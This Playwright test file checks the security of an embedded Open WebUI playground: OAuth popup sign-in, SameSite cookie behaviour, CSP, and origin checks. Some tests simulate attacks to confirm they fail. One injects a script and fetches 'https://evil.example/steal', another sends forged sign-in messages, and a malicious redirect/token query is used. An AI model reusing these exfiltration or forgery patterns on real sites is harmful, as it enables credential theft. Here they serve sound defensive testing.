const { test } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const { chromium } = require("playwright");
const root = path.join(__dirname, "..");
const WEBUI = "https://cyth.18-118-248-231.sslip.io";
const SITE = "https://celesteisyy.github.io";
const PLAYGROUND = SITE + "/playground/";
const FRAME_CSP = "frame-ancestors 'self' " + SITE;

async function mount(t, options = {}) {
  const browser = await chromium.launch({ headless: true });
  t.after(() => browser.close());
  const context = await browser.newContext({ serviceWorkers: "block", viewport: { width: 1280, height: 850 } });
  const page = await context.newPage();
  const calls = [], errors = [];
  const state = { blocked: false, status: null, toolCalls: 0 };
  context.on("page", p => p.on("pageerror", e => errors.push(e.message)));
  page.on("pageerror", e => errors.push(e.message));
  async function setSession(sameSite = "None") {
    await context.addCookies([
      { name: "token", value: "owner-fixture", url: WEBUI, secure: true, sameSite },
      { name: "oauth_session_id", value: "server-session", url: WEBUI, secure: true, httpOnly: true, sameSite },
    ]);
  }
  if (options.authenticated) await setSession(options.sameSite);
  await context.route("**/*", async route => {
    const request = route.request();
    const url = new URL(request.url());
    const headers = await request.allHeaders();
    calls.push({ url: request.url(), headers, method: request.method() });
    const embedded = request.frame().page() === page && new URL(page.url()).origin === SITE;
    const session = (!state.blocked || !embedded) && headers.cookie?.includes("token=owner-fixture");
    const html = body => route.fulfill({ contentType: "text/html", headers: { "content-security-policy": FRAME_CSP }, body });
    if ([WEBUI, SITE].includes(url.origin) && url.pathname.startsWith("/playground/")) {
      const aliases = { "/playground/": "index.html", "/playground/embed/": "embed.html", "/playground/sign-in": "sign-in.html", "/playground/login-complete": "login-complete.html" };
      const name = aliases[url.pathname] || url.pathname.slice("/playground/".length);
      if (!["index.html", "embed.html", "sign-in.html", "login-complete.html", "webui.css", "embed.js"].includes(name)) return route.fulfill({ status: 404, body: "missing" });
      return route.fulfill({ contentType: name.endsWith(".js") ? "application/javascript" : name.endsWith(".css") ? "text/css" : "text/html", headers: { "content-security-policy": FRAME_CSP }, body: fs.readFileSync(path.join(root, name)) });
    }
    if (url.origin === WEBUI && url.pathname === "/api/v1/auths/") {
      return route.fulfill({ status: state.status || (session ? 200 : 401), contentType: "application/json", body: JSON.stringify(session ? { id: "owner" } : { detail: "Unauthorized" }) });
    }
    if (url.origin === WEBUI && url.pathname === "/oauth/oidc/login") {
      return html('<h1>Cognito fixture</h1><button onclick="location.assign(\'/oauth/oidc/callback\')">Confirm sign-in</button>');
    }
    if (url.origin === WEBUI && url.pathname === "/oauth/oidc/callback") {
      await setSession();
      return html('<script>location.replace("/auth")</script>');
    }
    if (url.origin === WEBUI && url.pathname === "/auth") {
      // Match the verified Open WebUI cookie bootstrap and existing return-path key.
      return html(`<h1>Signing in</h1><script>
        if (document.cookie.includes('token=owner-fixture')) {
          localStorage.token='owner-fixture';
          const target=localStorage.getItem('redirectPath') || '/';
          localStorage.removeItem('redirectPath');
          location.replace(target);
        }
      </script>`);
    }
    if (url.origin === WEBUI && url.pathname === "/") {
      return html(`<h1>Open WebUI fixture</h1><button id="tool">Check scanner</button><button id="logout">Sign out</button><p id="result"></p><script>
        document.getElementById('tool').onclick=async()=>{
          const r=await fetch('/api/tool-fixture',{method:'POST',headers:{Authorization:'Bearer '+localStorage.token}});
          document.getElementById('result').textContent=String(r.status);
        };
        document.getElementById('logout').onclick=()=>{
          document.cookie='token=; Max-Age=0; path=/; Secure; SameSite=None';
          localStorage.removeItem('token'); location.assign('/auth');
        };
      </script>`);
    }
    if (url.origin === WEBUI && url.pathname === "/api/tool-fixture") {
      if (session && headers.authorization === "Bearer owner-fixture" && headers.origin === WEBUI && headers.cookie?.includes("oauth_session_id=server-session")) state.toolCalls++;
      return route.fulfill({ status: state.toolCalls ? 200 : 401, body: "{}" });
    }
    if (url.origin === "https://evil.example") return html(`<iframe src="${WEBUI}/playground/embed/"></iframe>`);
    return route.fulfill({ status: 404, body: "blocked destination" });
  });
  await page.goto(options.url || PLAYGROUND);
  const helper = () => page.frames().find(f => f.url().startsWith(WEBUI + "/playground/embed/"));
  const conversation = () => page.frameLocator("#webui").frameLocator("#conversation");
  return { browser, context, page, calls, errors, state, helper, conversation, setSession };
}

async function signIn(context, page) {
  const opened = context.waitForEvent("page");
  await page.frameLocator("#webui").getByRole("button", { name: "Sign in", exact: true }).click();
  const popup = await opened;
  await popup.getByRole("button", { name: "Confirm sign-in" }).click();
  return popup;
}

test("GitHub keeps its URL and public navigation; no query or credentials are forwarded", async t => {
  const { page, calls, errors } = await mount(t, { url: PLAYGROUND + "?code=private-code&redirect=https://evil.example/#token=private-token" });
  await page.frameLocator("#webui").getByRole("button", { name: "Sign in", exact: true }).waitFor();
  assert.equal(new URL(page.url()).origin, SITE);
  assert.equal(new URL(page.url()).pathname, "/playground/");
  assert.ok(!calls.some(c => c.url.startsWith(WEBUI) && /private-|evil\.example/.test(c.url)));
  assert.ok(!calls.some(c => c.url.startsWith(SITE) && /\/api\//.test(c.url)));
  for (const width of [1280, 390]) {
    await page.setViewportSize({ width, height: 850 });
    assert.equal(await page.getByRole("link", { name: "Home", exact: true }).getAttribute("href"), SITE + "/");
    assert.equal(await page.frameLocator("#webui").getByRole("link", { name: "Back to home", exact: true }).getAttribute("href"), SITE + "/");
    const box = await page.locator("#webui").boundingBox();
    assert.ok(box.width > 300 && box.height > 500);
    assert.ok(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth));
  }
  assert.deepEqual(errors, []);
});

test("popup OAuth returns to the embedded chat and tools keep session credentials on cyth", async t => {
  const { context, page, calls, errors, state, conversation } = await mount(t);
  await signIn(context, page);
  await conversation().getByRole("button", { name: "Check scanner" }).waitFor({ timeout: 15000 });
  await conversation().getByRole("button", { name: "Check scanner" }).click();
  await conversation().getByText("200", { exact: true }).waitFor();
  assert.equal(state.toolCalls, 1);
  assert.equal(page.url(), PLAYGROUND);
  assert.equal(await page.evaluate(() => localStorage.getItem("token")), null);
  assert.equal(await page.evaluate(() => document.cookie.includes("owner-fixture")), false);
  assert.ok(calls.filter(c => c.url.startsWith(SITE)).every(c => !c.headers.authorization && !c.headers.cookie?.includes("owner-fixture")));
  assert.ok(calls.some(c => c.url === WEBUI + "/oauth/oidc/login"));
  assert.deepEqual(errors, []);
});

test("an existing None session opens in the iframe, while Lax does not authenticate the cross-site request", async t => {
  const { page, conversation } = await mount(t, { authenticated: true });
  await conversation().getByRole("button", { name: "Check scanner" }).waitFor({ timeout: 15000 });
  assert.equal(page.url(), PLAYGROUND);
  const other = await mount(t, { authenticated: true, sameSite: "Lax" });
  await other.page.frameLocator("#webui").getByRole("button", { name: "Sign in", exact: true }).waitFor();
  assert.ok(other.calls.some(c => c.url === WEBUI + "/api/v1/auths/" && !c.headers.cookie?.includes("owner-fixture")));
});

test("sign-out returns to the embedded sign-in gate without navigating GitHub away", async t => {
  const { page, conversation } = await mount(t, { authenticated: true });
  await conversation().getByRole("button", { name: "Sign out" }).waitFor({ timeout: 15000 });
  await conversation().getByRole("button", { name: "Sign out" }).click();
  await page.frameLocator("#webui").getByRole("button", { name: "Sign in", exact: true }).waitFor();
  assert.equal(page.url(), PLAYGROUND);
});

test("blocked embedded sessions stay unauthenticated and expose a permission/fallback action", async t => {
  const { context, page, state } = await mount(t);
  state.blocked = true;
  await signIn(context, page);
  await page.frameLocator("#webui").getByText("Finish signing in, then choose Continue. Your browser may ask to allow sign-in here.").waitFor({ timeout: 15000 });
  assert.equal(await page.frameLocator("#webui").locator("#conversation").isVisible(), false);
  await page.frameLocator("#webui").getByRole("button", { name: "Continue", exact: true }).waitFor();
  assert.equal(await page.frameLocator("#webui").getByRole("link", { name: "Open full workspace", exact: true }).getAttribute("href"), WEBUI + "/");
});

test("untrusted completion messages cannot authenticate the embed", async t => {
  const { page, helper, state } = await mount(t);
  await page.frameLocator("#webui").getByRole("button", { name: "Sign in", exact: true }).waitFor();
  await helper().evaluate(() => {
    for (const origin of ["https://evil.example", location.origin]) {
      window.dispatchEvent(new MessageEvent("message", { origin, source: window, data: { type: "cyssie-signed-in", token: "forged" } }));
    }
  });
  assert.equal(await page.frameLocator("#webui").locator("#conversation").isVisible(), false);
  assert.equal(state.toolCalls, 0);
  assert.equal(await page.evaluate(() => localStorage.getItem("token")), null);
});

test("CSP blocks injected scripts and outbound requests inside the helper", async t => {
  const { page, helper, calls } = await mount(t);
  await page.frameLocator("#webui").getByRole("button", { name: "Sign in", exact: true }).waitFor();
  const result = await helper().evaluate(async () => {
    const script = document.createElement("script"); script.textContent = "window.__attack = true"; document.body.appendChild(script);
    let blocked = false; try { await fetch("https://evil.example/steal"); } catch { blocked = true; }
    return { blocked, ran: !!window.__attack };
  });
  assert.deepEqual(result, { blocked: true, ran: false });
  assert.ok(!calls.some(c => c.url.startsWith("https://evil.example/")));
});

test("unexpected service failures offer retry without claiming the user signed out", async t => {
  const { page, state } = await mount(t);
  state.status = 503;
  await page.reload();
  await page.frameLocator("#webui").getByText("The workspace is unavailable. Please try again.").waitFor();
  await page.frameLocator("#webui").getByRole("button", { name: "Try again", exact: true }).waitFor();
});

test("foreign sites cannot run the embedded helper", async t => {
  const { calls } = await mount(t, { url: "https://evil.example/" });
  assert.ok(calls.some(c => c.url === WEBUI + "/playground/embed/"));
  assert.ok(!calls.some(c => c.url === WEBUI + "/api/v1/auths/"));
});
